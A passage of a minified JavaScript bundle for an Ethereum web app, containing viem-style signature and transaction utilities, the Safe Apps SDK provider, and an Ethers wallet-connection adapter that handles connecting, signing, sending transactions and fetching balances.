Ea=tde();Object.defineProperty(t,"createNonceManager",{enumerable:!0,get:function(){return Ea.createNonceManager}}),Object.defineProperty(t,"nonceManager",{enumerable:!0,get:function(){return Ea.nonceManager}});var b0=Ple();Object.defineProperty(t,"withCache",{enumerable:!0,get:function(){return b0.withCache}});var w0=tR();Object.defineProperty(t,"withRetry",{enumerable:!0,get:function(){return w0.withRetry}});var v0=EM();Object.defineProperty(t,"withTimeout",{enumerable:!0,get:function(){return v0.withTimeout}});var gy=GHe();Object.defineProperty(t,"compactSignatureToSignature",{enumerable:!0,get:function(){return gy.compactSignatureToSignature}});var oh=XA();Object.defineProperty(t,"hashMessage",{enumerable:!0,get:function(){return oh.hashMessage}});var ls=e5();Object.defineProperty(t,"hashDomain",{enumerable:!0,get:function(){return ls.hashDomain}}),Object.defineProperty(t,"hashStruct",{enumerable:!0,get:function(){return ls.hashStruct}}),Object.defineProperty(t,"hashTypedData",{enumerable:!0,get:function(){return ls.hashTypedData}});var Xr=SM();Object.defineProperty(t,"isErc6492Signature",{enumerable:!0,get:function(){return Xr.isErc6492Signature}});var Ei=IM();Object.defineProperty(t,"isErc8010Signature",{enumerable:!0,get:function(){return Ei.isErc8010Signature}});var ru=KHe();Object.defineProperty(t,"hexToCompactSignature",{enumerable:!0,get:function(){return ru.parseCompactSignature}}),Object.defineProperty(t,"parseCompactSignature",{enumerable:!0,get:function(){return ru.parseCompactSignature}});var E0=dde();Object.defineProperty(t,"parseErc6492Signature",{enumerable:!0,get:function(){return E0.parseErc6492Signature}});var Fn=fde();Object.defineProperty(t,"parseErc8010Signature",{enumerable:!0,get:function(){return Fn.parseErc8010Signature}});var rl=ZHe();Object.defineProperty(t,"hexToSignature",{enumerable:!0,get:function(){return rl.parseSignature}}),Object.defineProperty(t,"parseSignature",{enumerable:!0,get:function(){return rl.parseSignature}});var cc=u0();Object.defineProperty(t,"recoverAddress",{enumerable:!0,get:function(){return cc.recoverAddress}});var dd=RM();Object.defineProperty(t,"recoverMessageAddress",{enumerable:!0,get:function(){return dd.recoverMessageAddress}});var js=zj();Object.defineProperty(t,"recoverPublicKey",{enumerable:!0,get:function(){return js.recoverPublicKey}});var ah=YHe();Object.defineProperty(t,"recoverTransactionAddress",{enumerable:!0,get:function(){return ah.recoverTransactionAddress}});var yy=PM();Object.defineProperty(t,"recoverTypedDataAddress",{enumerable:!0,get:function(){return yy.recoverTypedDataAddress}});var ch=QHe();Object.defineProperty(t,"compactSignatureToHex",{enumerable:!0,get:function(){return ch.serializeCompactSignature}}),Object.defineProperty(t,"serializeCompactSignature",{enumerable:!0,get:function(){return ch.serializeCompactSignature}});var il=hde();Object.defineProperty(t,"serializeErc6492Signature",{enumerable:!0,get:function(){return il.serializeErc6492Signature}});var by=pde();Object.defineProperty(t,"serializeErc8010Signature",{enumerable:!0,get:function(){return by.serializeErc8010Signature}});var iu=Sde();Object.defineProperty(t,"signatureToHex",{enumerable:!0,get:function(){return iu.serializeSignature}}),Object.defineProperty(t,"serializeSignature",{enumerable:!0,get:function(){return iu.serializeSignature}});var Ms=JHe();Object.defineProperty(t,"signatureToCompactSignature",{enumerable:!0,get:function(){return Ms.signatureToCompactSignature}});var wy=ode();Object.defineProperty(t,"toPrefixedMessage",{enumerable:!0,get:function(){return wy.toPrefixedMessage}});var _0=mde();Object.defineProperty(t,"verifyHash",{enumerable:!0,get:function(){return _0.verifyHash}});var A0=gde();Object.defineProperty(t,"verifyMessage",{enumerable:!0,get:function(){return A0.verifyMessage}});var uh=yde();Object.defineProperty(t,"verifyTypedData",{enumerable:!0,get:function(){return uh.verifyTypedData}});var vy=Ns();Object.defineProperty(t,"stringify",{enumerable:!0,get:function(){return vy.stringify}});var sl=Qu();Object.defineProperty(t,"assertRequest",{enumerable:!0,get:function(){return sl.assertRequest}});var ol=rR();Object.defineProperty(t,"assertTransactionEIP1559",{enumerable:!0,get:function(){return ol.assertTransactionEIP1559}}),Object.defineProperty(t,"assertTransactionEIP2930",{enumerable:!0,get:function(){return ol.assertTransactionEIP2930}}),Object.defineProperty(t,"assertTransactionLegacy",{enumerable:!0,get:function(){return ol.assertTransactionLegacy}});var _a=NM();Object.defineProperty(t,"getSerializedTransactionType",{enumerable:!0,get:function(){return _a.getSerializedTransactionType}});var C0=Z8();Object.defineProperty(t,"getTransactionType",{enumerable:!0,get:function(){return C0.getTransactionType}});var Oo=OM();Object.defineProperty(t,"parseTransaction",{enumerable:!0,get:function(){return Oo.parseTransaction}});var al=bM();Object.defineProperty(t,"serializeAccessList",{enumerable:!0,get:function(){return al.serializeAccessList}});var uc=iR();Object.defineProperty(t,"serializeTransaction",{enumerable:!0,get:function(){return uc.serializeTransaction}});var lc=sR();Object.defineProperty(t,"domainSeparator",{enumerable:!0,get:function(){return lc.domainSeparator}}),Object.defineProperty(t,"getTypesForEIP712Domain",{enumerable:!0,get:function(){return lc.getTypesForEIP712Domain}}),Object.defineProperty(t,"serializeTypedData",{enumerable:!0,get:function(){return lc.serializeTypedData}}),Object.defineProperty(t,"validateTypedData",{enumerable:!0,get:function(){return lc.validateTypedData}});var lh=jA();Object.defineProperty(t,"formatEther",{enumerable:!0,get:function(){return lh.formatEther}});var cl=ay();Object.defineProperty(t,"formatGwei",{enumerable:!0,get:function(){return cl.formatGwei}});var Aa=H8();Object.defineProperty(t,"formatUnits",{enumerable:!0,get:function(){return Aa.formatUnits}});var ko=wde();Object.defineProperty(t,"parseEther",{enumerable:!0,get:function(){return ko.parseEther}});var fd=vde();Object.defineProperty(t,"parseGwei",{enumerable:!0,get:function(){return fd.parseGwei}});var Wn=cR();Object.defineProperty(t,"parseUnits",{enumerable:!0,get:function(){return Wn.parseUnits}})})(zO)),zO}var wm={},qte;function eze(){if(qte)return wm;qte=1,Object.defineProperty(wm,"__esModule",{value:!0}),wm.MAGIC_VALUE_BYTES=wm.MAGIC_VALUE=void 0;const t="0x1626ba7e";wm.MAGIC_VALUE=t;const e="0x20c13b0b";return wm.MAGIC_VALUE_BYTES=e,wm}var IT={},z2={},vm={},Vte;function Dde(){if(Vte)return vm;Vte=1,Object.defineProperty(vm,"__esModule",{value:!0}),vm.PermissionsError=vm.PERMISSIONS_REQUEST_REJECTED=void 0,vm.PERMISSIONS_REQUEST_REJECTED=4001;class t extends Error{constructor(n,r,i){super(n),this.code=r,this.data=i,Object.setPrototypeOf(this,t.prototype)}}return vm.PermissionsError=t,vm}var Wte;function Bde(){if(Wte)return z2;Wte=1,Object.defineProperty(z2,"__esModule",{value:!0}),z2.Wallet=void 0;const t=ry(),e=Dde();class n{constructor(i){this.communicator=i}async getPermissions(){return(await this.communicator.send(t.Methods.wallet_getPermissions,void 0)).data}async requestPermissions(i){if(!this.isPermissionRequestValid(i))throw new e.PermissionsError("Permissions request is invalid",e.PERMISSIONS_REQUEST_REJECTED);try{return(await this.communicator.send(t.Methods.wallet_requestPermissions,i)).data}catch{throw new e.PermissionsError("Permissions rejected",e.PERMISSIONS_REQUEST_REJECTED)}}isPermissionRequestValid(i){return i.every(s=>typeof s=="object"?Object.keys(s).every(o=>!!Object.values(t.RestrictedMethods).includes(o)):!1)}}return z2.Wallet=n,z2}var Gte;function tze(){if(Gte)return IT;Gte=1,Object.defineProperty(IT,"__esModule",{value:!0});const t=Bde(),e=Dde(),n=(i,s)=>s.some(o=>o.parentCapability===i),r=()=>(i,s,o)=>{const a=o.value;return o.value=async function(){const c=new t.Wallet(this.communicator);let l=await c.getPermissions();if(n(s,l)||(l=await c.requestPermissions([{[s]:{}}])),!n(s,l))throw new e.PermissionsError("Permissions rejected",e.PERMISSIONS_REQUEST_REJECTED);return a.apply(this)},o};return IT.default=r,IT}var Kte;function nze(){if(Kte)return Vd;Kte=1;var t=Vd&&Vd.__decorate||function(l,f,h,m){var b=arguments.length,w=b<3?f:m===null?m=Object.getOwnPropertyDescriptor(f,h):m,y;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")w=Reflect.decorate(l,f,h,m);else for(var E=l.length-1;E>=0;E--)(y=l[E])&&(w=(b<3?y(w):b>3?y(f,h,w):y(f,h))||w);return b>3&&w&&Object.defineProperty(f,h,w),w},e=Vd&&Vd.__importDefault||function(l){return l&&l.__esModule?l:{default:l}};Object.defineProperty(Vd,"__esModule",{value:!0}),Vd.Safe=void 0;const n=XHe(),r=eze(),i=ry(),s=Bj(),o=Dj(),a=e(tze());class c{constructor(f){this.communicator=f}async getChainInfo(){return(await this.communicator.send(i.Methods.getChainInfo,void 0)).data}async getInfo(){return(await this.communicator.send(i.Methods.getSafeInfo,void 0)).data}async experimental_getBalances({currency:f="usd"}={}){return(await this.communicator.send(i.Methods.getSafeBalances,{currency:f})).data}async check1271Signature(f,h="0x"){const m=await this.getInfo(),b=(0,n.encodeFunctionData)({abi:[{constant:!1,inputs:[{name:"_dataHash",type:"bytes32"},{name:"_signature",type:"bytes"}],name:"isValidSignature",outputs:[{name:"",type:"bytes4"}],payable:!1,stateMutability:"nonpayable",type:"function"}],functionName:"isValidSignature",args:[f,h]}),w={call:s.RPC_CALLS.eth_call,params:[{to:m.safeAddress,data:b},"latest"]};try{return(await this.communicator.send(i.Methods.rpcCall,w)).data.slice(0,10).toLowerCase()===r.MAGIC_VALUE}catch{return!1}}async check1271SignatureBytes(f,h="0x"){const m=await this.getInfo(),b=(0,n.encodeFunctionData)({abi:[{constant:!1,inputs:[{name:"_data",type:"bytes"},{name:"_signature",type:"bytes"}],name:"isValidSignature",outputs:[{name:"",type:"bytes4"}],payable:!1,stateMutability:"nonpayable",type:"function"}],functionName:"isValidSignature",args:[f,h]}),w={call:s.RPC_CALLS.eth_call,params:[{to:m.safeAddress,data:b},"latest"]};try{return(await this.communicator.send(i.Methods.rpcCall,w)).data.slice(0,10).toLowerCase()===r.MAGIC_VALUE_BYTES}catch{return!1}}calculateMessageHash(f){return(0,n.hashMessage)(f)}calculateTypedMessageHash(f){const h=typeof f.domain.chainId=="object"?f.domain.chainId.toNumber():Number(f.domain.chainId);let m=f.primaryType;if(!m){const b=Object.values(f.types),w=Object.keys(f.types).filter(y=>b.every(E=>E.every(({type:A})=>A.replace("[","").replace("]","")!==y)));if(w.length===0||w.length>1)throw new Error("Please specify primaryType");m=w[0]}return(0,n.hashTypedData)({message:f.message,domain:{...f.domain,chainId:h,verifyingContract:f.domain.verifyingContract,salt:f.domain.salt},types:f.types,primaryType:m})}async getOffChainSignature(f){return(await this.communicator.send(i.Methods.getOffChainSignature,f)).data}async isMessageSigned(f,h="0x"){let m;if(typeof f=="string"&&(m=async()=>{const b=this.calculateMessageHash(f);return await this.isMessageHashSigned(b,h)}),(0,o.isObjectEIP712TypedData)(f)&&(m=async()=>{const b=this.calculateTypedMessageHash(f);return await this.isMessageHashSigned(b,h)}),m)return await m();throw new Error("Invalid message type")}async isMessageHashSigned(f,h="0x"){const m=[this.check1271Signature.bind(this),this.check1271SignatureBytes.bind(this)];for(const b of m)if(await b(f,h))return!0;return!1}async getEnvironmentInfo(){return(await this.communicator.send(i.Methods.getEnvironmentInfo,void 0)).data}async requestAddressBook(){return(await this.communicator.send(i.Methods.requestAddressBook,void 0)).data}}return Vd.Safe=c,t([(0,a.default)()],c.prototype,"requestAddressBook",null),Vd}var Zte;function Yte(){if(Zte)return hb;Zte=1;var t=hb&&hb.__importDefault||function(a){return a&&a.__esModule?a:{default:a}};Object.defineProperty(hb,"__esModule",{value:!0});const e=t(rFe()),n=_Fe(),r=AFe(),i=nze(),s=Bde();class o{constructor(c={}){const{allowedDomains:l=null,debug:f=!1}=c;this.communicator=new e.default(l,f),this.eth=new r.Eth(this.communicator),this.txs=new n.TXs(this.communicator),this.safe=new i.Safe(this.communicator),this.wallet=new s.Wallet(this.communicator)}}return hb.default=o,hb}var Qte;function rze(){return Qte||(Qte=1,(function(t){var e=$d&&$d.__createBinding||(Object.create?(function(o,a,c,l){l===void 0&&(l=c);var f=Object.getOwnPropertyDescriptor(a,c);(!f||("get"in f?!a.__esModule:f.writable||f.configurable))&&(f={enumerable:!0,get:function(){return a[c]}}),Object.defineProperty(o,l,f)}):(function(o,a,c,l){l===void 0&&(l=c),o[l]=a[c]})),n=$d&&$d.__exportStar||function(o,a){for(var c in o)c!=="default"&&!Object.prototype.hasOwnProperty.call(a,c)&&e(a,o,c)},r=$d&&$d.__importDefault||function(o){return o&&o.__esModule?o:{default:o}};Object.defineProperty(t,"__esModule",{value:!0}),t.getSDKVersion=void 0;const i=r(Yte());t.default=i.default,n(Yte(),t),n(Dj(),t),n(ry(),t),n(ele(),t);var s=Xue();Object.defineProperty(t,"getSDKVersion",{enumerable:!0,get:function(){return s.getSDKVersion}}),n(Bj(),t)})($d)),$d}var Em={},Jte;function ize(){if(Jte)return Em;Jte=1,Object.defineProperty(Em,"__esModule",{value:!0}),Em.numberToHex=Em.getLowerCase=void 0;function t(n){return n&&n.toLowerCase()}Em.getLowerCase=t;function e(n){return`0x${n.toString(16)}`}return Em.numberToHex=e,Em}var Xte;function sze(){if(Xte)return Fv;Xte=1,Object.defineProperty(Fv,"__esModule",{value:!0}),Fv.SafeAppProvider=void 0;const t=rze(),e=Yre(),n=ize();class r extends e.EventEmitter{constructor(s,o){super(),this.submittedTxs=new Map,this.safe=s,this.sdk=o}async connect(){this.emit("connect",{chainId:this.chainId})}async disconnect(){}get chainId(){return this.safe.chainId}async request(s){const{method:o,params:a=[]}=s;switch(o){case"eth_accounts":return[this.safe.safeAddress];case"net_version":case"eth_chainId":return(0,n.numberToHex)(this.chainId);case"personal_sign":{const[m,b]=a;if(this.safe.safeAddress.toLowerCase()!==b.toLowerCase())throw new Error("The address or message hash is invalid");const w=await this.sdk.txs.signMessage(m);return("signature"in w?w.signature:void 0)||"0x"}case"eth_sign":{const[m,b]=a;if(this.safe.safeAddress.toLowerCase()!==m.toLowerCase()||!b.startsWith("0x"))throw new Error("The address or message hash is invalid");const w=await this.sdk.txs.signMessage(b);return("signature"in w?w.signature:void 0)||"0x"}case"eth_signTypedData":case"eth_signTypedData_v4":{const[m,b]=a,w=typeof b=="string"?JSON.parse(b):b;if(this.safe.safeAddress.toLowerCase()!==m.toLowerCase())throw new Error("The address is invalid");const y=await this.sdk.txs.signTypedMessage(w);return("signature"in y?y.signature:void 0)||"0x"}case"eth_sendTransaction":const c={...a[0],value:a[0].value||"0",data:a[0].data||"0x"};typeof c.gas=="string"&&c.gas.startsWith("0x")&&(c.gas=parseInt(c.gas,16));const l=await this.sdk.txs.send({txs:[c],params:{safeTxGas:c.gas}});return this.submittedTxs.set(l.safeTxHash,{from:this.safe.safeAddress,hash:l.safeTxHash,gas:0,gasPrice:"0x00",nonce:0,input:c.data,value:c.value,to:c.to,blockHash:null,blockNumber:null,transactionIndex:null}),l.safeTxHash;case"eth_blockNumber":return(await this.sdk.eth.getBlockByNumber(["latest"])).number;case"eth_getBalance":return this.sdk.eth.getBalance([(0,n.getLowerCase)(a[0]),a[1]]);case"eth_getCode":return this.sdk.eth.getCode([(0,n.getLowerCase)(a[0]),a[1]]);case"eth_getTransactionCount":return this.sdk.eth.getTransactionCount([(0,n.getLowerCase)(a[0]),a[1]]);case"eth_getStorageAt":return this.sdk.eth.getStorageAt([(0,n.getLowerCase)(a[0]),a[1],a[2]]);case"eth_getBlockByNumber":return this.sdk.eth.getBlockByNumber([a[0],a[1]]);case"eth_getBlockByHash":return this.sdk.eth.getBlockByHash([a[0],a[1]]);case"eth_getTransactionByHash":let h=a[0];try{h=(await this.sdk.txs.getBySafeTxHash(h)).txHash||h}catch{}return this.submittedTxs.has(h)?this.submittedTxs.get(h):this.sdk.eth.getTransactionByHash([h]).then(m=>(m&&(m.hash=a[0]),m));case"eth_getTransactionReceipt":{let m=a[0];try{m=(await this.sdk.txs.getBySafeTxHash(m)).txHash||m}catch{}return this.sdk.eth.getTransactionReceipt([m]).then(b=>(b&&(b.transactionHash=a[0]),b))}case"eth_estimateGas":return this.sdk.eth.getEstimateGas(a[0]);case"eth_call":return this.sdk.eth.call([a[0],a[1]]);case"eth_getLogs":return this.sdk.eth.getPastLogs([a[0]]);case"eth_gasPrice":return this.sdk.eth.getGasPrice();case"wallet_getPermissions":return this.sdk.wallet.getPermissions();case"wallet_requestPermissions":return this.sdk.wallet.requestPermissions(a[0]);case"safe_setSettings":return this.sdk.eth.setSafeSettings([a[0]]);case"wallet_sendCalls":{const{from:m,calls:b,chainId:w}=a[0];if(w!==(0,n.numberToHex)(this.chainId))throw new Error(`Safe is not on chain ${w}`);if(m!==this.safe.safeAddress)throw Error("Invalid from address");const y=b.map((R,S)=>{if(!R.to)throw new Error(`Invalid call #${S}: missing "to" field`);return{to:R.to,data:R.data??"0x",value:R.value??(0,n.numberToHex)(0)}}),{safeTxHash:E}=await this.sdk.txs.send({txs:y});return{id:E}}case"wallet_getCallsStatus":{const m=a[0],b={[t.TransactionStatus.AWAITING_CONFIRMATIONS]:100,[t.TransactionStatus.AWAITING_EXECUTION]:100,[t.TransactionStatus.SUCCESS]:200,[t.TransactionStatus.CANCELLED]:400,[t.TransactionStatus.FAILED]:500},w=await this.sdk.txs.getBySafeTxHash(m),y={version:"1.0",id:m,chainId:(0,n.numberToHex)(this.chainId),status:b[w.txStatus]};if(!w.txHash)return y;const E=await this.sdk.eth.getTransactionReceipt([w.txHash]);if(!E)return y;const A=w.txData?.dataDecoded?.method!=="multiSend"?1:w.txData.dataDecoded.parameters?.[0].valueDecoded?.length??1,R=Number(E.blockNumber),S=Number(E.gasUsed);return y.receipts=Array(A).fill({logs:E.logs,status:(0,n.numberToHex)(w.txStatus===t.TransactionStatus.SUCCESS?1:0),blockHash:E.blockHash,blockNumber:(0,n.numberToHex)(R),gasUsed:(0,n.numberToHex)(S),transactionHash:w.txHash}),y}case"wallet_showCallsStatus":throw new Error(`"${s.method}" not supported`);case"wallet_getCapabilities":return{[(0,n.numberToHex)(this.chainId)]:{atomicBatch:{supported:!0}}};default:throw Error(`"${s.method}" not implemented`)}}send(s,o){s||o("Undefined request"),this.request(s).then(a=>o(null,{jsonrpc:"2.0",id:s.id,result:a})).catch(a=>o(a,null))}}return Fv.SafeAppProvider=r,Fv}var ene;function oze(){return ene||(ene=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.SafeAppProvider=void 0;var e=sze();Object.defineProperty(t,"SafeAppProvider",{enumerable:!0,get:function(){return e.SafeAppProvider}})})(MO)),MO}var aze=oze();class cze extends aze.SafeAppProvider{request(e){return e.method==="eth_requestAccounts"?this.request({method:"eth_accounts",params:[]}):super.request(e)}}class uze extends kj{async initialize(){const{default:e}=await pt(async()=>{const{default:s}=await import("./index-CHgVnNch.js");return{default:s}},__vite__mapDeps([69,2])),n=new e,r=await n.safe.getInfo(),i=new cze(r,n);await i.connect().catch(s=>{console.info("Failed to auto-connect to Safe:",s)}),this.provider=i,this.initialized=!0}async getProvider(){return Promise.resolve(this.provider)}}class lze extends kj{async initialize(){if(!(typeof window>"u")&&window.ethereum)return this.provider=window.ethereum,this.initialized=!0,Promise.resolve()}}const kb={signMessage:async(t,e,n)=>{if(!e)throw new Error("signMessage - provider is undefined");const r=gr(t)?t:rt(Hl(t));return await e.request({method:"personal_sign",params:[r,n]})},estimateGas:async(t,e,n,r)=>{if(!e)throw new Error("estimateGas - provider is undefined");if(!n)throw new Error("estimateGas - address is undefined");if(t.chainNamespace&&t.chainNamespace!=="eip155")throw new Error("estimateGas - chainNamespace is not eip155");const i={from:t.address,to:t.to,data:t.data,type:0},s=new Bl(e,r);return await new d1(s,n).estimateGas(i)},sendTransaction:async(t,e,n,r)=>{if(!e)throw new Error("sendTransaction - provider is undefined");if(!n)throw new Error("sendTransaction - address is undefined");if(t.chainNamespace&&t.chainNamespace!=="eip155")throw new Error("sendTransaction - chainNamespace is not eip155");const i={to:t.to,value:t.value,gasLimit:t.gas,gasPrice:t.gasPrice,data:t.data,type:0},s=new Bl(e,r);return(await(await new d1(s,n).sendTransaction(i)).wait())?.hash||null},writeContract:async(t,e,n,r)=>{if(!e)throw new Error("writeContract - provider is undefined");if(!n)throw new Error("writeContract - address is undefined");const i=new Bl(e,r),s=new d1(i,n),o=new vp(t.tokenAddress,t.abi,s);if(!o||!t.method)throw new Error("Contract method is undefined");const a=o[t.method];if(a)return await a(...t.args);throw new Error("Contract method is undefined")},parseWalletCapabilities:t=>{try{return JSON.parse(t)}catch{throw new Error("Error parsing wallet capabilities")}},parseUnits:FBe,formatUnits:pj};class dze extends bae{constructor(){super({adapterType:ge.ADAPTER_TYPES.ETHERS,namespace:ge.CHAIN.EVM}),this.balancePromises={},this.ethersProviders={}}async createEthersConfig(){const{metadata:e,enableCoinbase:n,enableInjected:r,enableEIP6963:i}=de.state;if(e){if(r!==!1){const s=new lze;await s.initialize(),this.ethersProviders.injected=s}if(n!==!1&&(this.ethersProviders.baseAccount=new tFe),xe.isSafeApp()){const s=new uze;await s.initialize(),this.ethersProviders.safe=s}return{...this.ethersProviders,EIP6963:i!==!1,metadata:e}}}async signMessage(e){const{message:n,address:r,provider:i}=e;if(!i)throw new Error("Provider is undefined");try{return{signature:await kb.signMessage(n,i,r)}}catch{throw new Error("EthersAdapter:signMessage - Sign message failed")}}async sendTransaction(e){if(!e.provider)throw new Error("Provider is undefined");const n=Y.getAccountData(ge.CHAIN.EVM)?.address;if(!n)throw new Error("Address is undefined");return{hash:await kb.sendTransaction({value:Number.isNaN(Number(e.value))?BigInt(0):BigInt(e.value),to:e.to,data:e.data?e.data:"0x",gas:e.gas?BigInt(e.gas):void 0,gasPrice:e.gasPrice?BigInt(e.gasPrice):void 0,address:n},e.provider,n,Number(e.caipNetwork?.id))}}async writeContract(e){if(!e.provider)throw new Error("Provider is undefined");const{address:n}=gi.parseCaipAddress(e.caipAddress);return{hash:await kb.writeContract(e,e.provider,n,Number(e.caipNetwork?.id))}}async estimateGas(e){const{provider:n,caipNetwork:r,address:i}=e;if(!n)throw new Error("Provider is undefined");try{return{gas:await kb.estimateGas({data:e.data,to:e.to,address:i},n,i,Number(r?.id))}}catch{throw new Error("EthersAdapter:estimateGas - Estimate gas failed")}}parseUnits(e){return kb.parseUnits(e.value,e.decimals)}formatUnits(e){return kb.formatUnits(e.value,e.decimals)}async syncConnection(e){const{id:n,chainId:r}=e,i=this.connectors.find(c=>c.id===n),s=i?.provider;if(!s)throw new Error("Provider not found");const o=await s.request({method:"eth_requestAccounts"}),a=await s.request({method:"eth_chainId"});if(this.listenProviderEvents(n,s),!o[0])throw new Error("No accounts found");if(!i?.type)throw new Error("Connector type not found");return{address:this.toChecksummedAddress(o[0]),chainId:Number(a)||Number(r),provider:s,type:i.type,id:n}}async syncConnectors(){this.ethersConfig=await this.createEthersConfig(),this.ethersConfig?.EIP6963&&this.listenInjectedConnector(!0);const n=Object.keys(this.ethersConfig||{}).filter(r=>r!=="metadata"&&r!=="EIP6963").map(async r=>{const i=r===ge.CONNECTOR_ID.INJECTED;if(this.namespace){const s=this.ethersProviders[r];this.addConnector({id:r,explorerId:Ga.ConnectorExplorerIds[r],imageUrl:Pi.state.connectorImages?.[r],name:Ga.ConnectorNamesMap[r]||"Unknown",imageId:Ga.ConnectorImageIds[r],type:Ga.ConnectorTypesMap[r]??"EXTERNAL",info:i?void 0:{rdns:r},chain:this.namespace,chains:[],provider:await s?.getProvider()})}});await Promise.all(n)}async disconnectAll(){return{connections:await Promise.all(this.connections.map(async n=>{const r=this.connectors.find(i=>Gr.isLowerCaseMatch(i.id,n.connectorId));if(!r)throw new Error("Connector not found");return await this.disconnect({id:r.id}),n}))}}async syncConnections({connectToFirstConnector:e}){const n=this.getCaipNetworks();await Promise.all(this.connectors.filter(r=>{const{hasDisconnected:i,hasConnected:s}=Gr.getConnectorStorageInfo(r.id,this.namespace);return!i&&s}).map(async r=>{if(r.id===ge.CONNECTOR_ID.WALLET_CONNECT){const i=$l.getWalletConnectAccounts(this.universalProvider,this.namespace),s=n.find(o=>o.chainNamespace===this.namespace&&o.id.toString()===i[0]?.chainId?.toString());i.length>0&&this.addConnection({connectorId:r.id,accounts:i.map(o=>({address:o.address})),caipNetwork:s})}else{const{accounts:i,chainId:s}=await Va.fetchProviderData(r);if(i.length>0&&s){const o=n.find(a=>a.chainNamespace===this.namespace&&a.id.toString()===s.toString());this.addConnection({connectorId:r.id,accounts:i.map(a=>({address:a})),caipNetwork:o}),r.provider&&r.id!==ge.CONNECTOR_ID.AUTH&&r.id!==ge.CONNECTOR_ID.WALLET_CONNECT&&this.listenProviderEvents(r.id,r.provider)}}})),e&&this.emitFirstAvailableConnection()}async setUniversalProvider(e){this.universalProvider=e;const n=ge.CONNECTOR_ID.WALLET_CONNECT;return $l.listenWcProvider({universalProvider:e,namespace:ge.CHAIN.EVM,onConnect:r=>this.onConnect(r,n),onDisconnect:()=>this.onDisconnect(n),onAccountsChanged:r=>this.onAccountsChanged(r,n,!1),onChainChanged:r=>this.onChainChanged(r,n)}),this.addConnector(new wae({provider:e,caipNetworks:this.getCaipNetworks(),namespace:ge.CHAIN.EVM})),Promise.resolve()}eip6963EventHandler(e){if(e.detail){const{info:n,provider:r}=e.detail;if(!this.connectors?.find(s=>s.name===n?.name)){const s=Ga.ConnectorTypesMap[ge.CONNECTOR_ID.EIP6963],o=n?.rdns||n?.name||n?.uuid;this.namespace&&o&&this.addConnector({id:o,type:s,imageUrl:n?.icon,name:n?.name||"Unknown",provider:r,info:n,chain:this.namespace,chains:[]})}}}listenInjectedConnector(e){if(typeof window<"u"&&e){const n=this.eip6963EventHandler.bind(this);window.addEventListener(sn.EIP6963_ANNOUNCE_EVENT,n),window.dispatchEvent(new Event(sn.EIP6963_REQUEST_EVENT))}}async connect({id:e,address:n,type:r,chainId:i,socialUri:s}){try{const o=this.connectors.find(m=>Gr.isLowerCaseMatch(m.id,e));if(!o)throw new Error("Connector not found");const a=this.getConnection({address:n,connectorId:e,connections:this.connections,connectors:this.connectors});if(a){const m=a.caipNetwork;if(!m)throw new Error("EthersAdapter:connect - could not find the caipNetwork to connect");if(a.account)return this.emit("accountChanged",{address:this.toChecksummedAddress(a.account.address),chainId:m.id,connector:o}),{address:this.toChecksummedAddress(a.account.address),chainId:m.id,provider:o.provider,type:o.type,id:e}}let c=o?.provider;const l=this.ethersProviders[o.id];if(l&&(await l.initialize(),c=await l.getProvider()),!c)throw new Error("Provider not found");o.provider=c;let f=[],h;if(r===sn.CONNECTOR_TYPE_AUTH){const{address:m,accounts:b}=await As.authConnectorAuthenticate({authConnector:c,chainNamespace:ge.CHAIN.EVM,chainId:i,socialUri:s,preferredAccountType:Zr("eip155")}),w=this.getCaipNetworks().find(y=>y.id.toString()===i?.toString());f=[m],this.addConnection({connectorId:e,accounts:b?b.map(y=>({address:y.address})):f.map(y=>({address:y})),caipNetwork:w,auth:{name:Be.getConnectedSocialProvider(),username:Be.getConnectedSocialUsername()}}),this.emit("accountChanged",{address:this.toChecksummedAddress(f[0]),chainId:Number(i),connector:o})}else{f=await c.request({method:"eth_requestAccounts"}),h=await c.request({method:"eth_chainId"});const m=this.getCaipNetworks().find(b=>b.id.toString()===i?.toString());if(h!==i){if(!m)throw new Error("EthersAdapter:connect - could not find the caipNetwork to switch");try{await c?.request({method:"wallet_switchEthereumChain",params:[{chainId:f1.numberToHexString(m.id)}]})}catch{throw new Error("EthersAdapter:connect - Switch network failed")}}this.emit("accountChanged",{address:this.toChecksummedAddress(f[0]),chainId:Number(i),connector:o}),this.addConnection({connectorId:e,accounts:f.map(b=>({address:b})),caipNetwork:m}),o.id!==ge.CONNECTOR_ID.WALLET_CONNECT&&this.listenProviderEvents(e,c)}return{address:this.toChecksummedAddress(f[0]),chainId:Number(i),provider:c,type:r,id:e}}catch(o){throw Ka.isUserRejectedRequestError(o)?new JD(o):o}}async reconnect(e){const{id:n,chainId:r}=e,i=this.connectors.find(s=>s.id===n);i&&i.type==="AUTH"&&r&&await As.authConnectorAuthenticate({authConnector:i.provider,chainNamespace:ge.CHAIN.EVM,chainId:r,preferredAccountType:Zr("eip155")})}async getAccounts(e){const n=this.connectors.find(o=>o.id===e.id),r=n?.provider;if(!r||!n)throw new Error("Provider not found");const i=this.getConnection({connectorId:e.id,connections:this.connections,connectors:this.connectors});if(i)return{accounts:i.accounts.map(({address:o})=>xe.createAccount(ge.CHAIN.EVM,o,"eoa"))};if(e.id===ge.CONNECTOR_ID.AUTH){const o=n.provider;if(!o.user)return{accounts:[]};const{accounts:a,address:c}=o.user;return Promise.resolve({accounts:(a||[{address:c,type:"eoa"}]).map(l=>xe.createAccount(ge.CHAIN.EVM,l.address,l.type))})}return{accounts:(await r.request({method:"eth_requestAccounts"})).map(o=>xe.createAccount(ge.CHAIN.EVM,o,"eoa"))}}async disconnect(e){if(e.id){const n=this.connectors.find(i=>Gr.isLowerCaseMatch(i.id,e.id));if(!n)throw new Error("Connector not found");const r=this.getConnection({connectorId:e.id,connections:this.connections,connectors:this.connectors});switch(n.type){case sn.CONNECTOR_TYPE_WALLET_CONNECT:n.provider.session&&n.provider.disconnect();break;case sn.CONNECTOR_TYPE_AUTH:await n.provider?.disconnect();break;case sn.CONNECTOR_TYPE_ANNOUNCED:case sn.CONNECTOR_TYPE_EXTERNAL:await this.revokeProviderPermissions(n.provider);break;default:throw new Error("Unsupported provider type")}return n.id&&(this.removeProviderListeners(n.id),this.deleteConnection(n.id)),this.connections.length===0?this.emit("disconnect"):this.emitFirstAvailableConnection(),{connections:r?[r]:[]}}return this.disconnectAll()}async getBalance(e){const n=e.address,r=this.getCaipNetworks().find(i=>i.id.toString()===e.chainId?.toString());if(!n)return Promise.resolve({balance:"0.00",symbol:"ETH"});if(r&&r.chainNamespace===ge.CHAIN.EVM){const i=`${r.caipNetworkId}:${n}`,s=this.balancePromises[i];if(s)return s;const 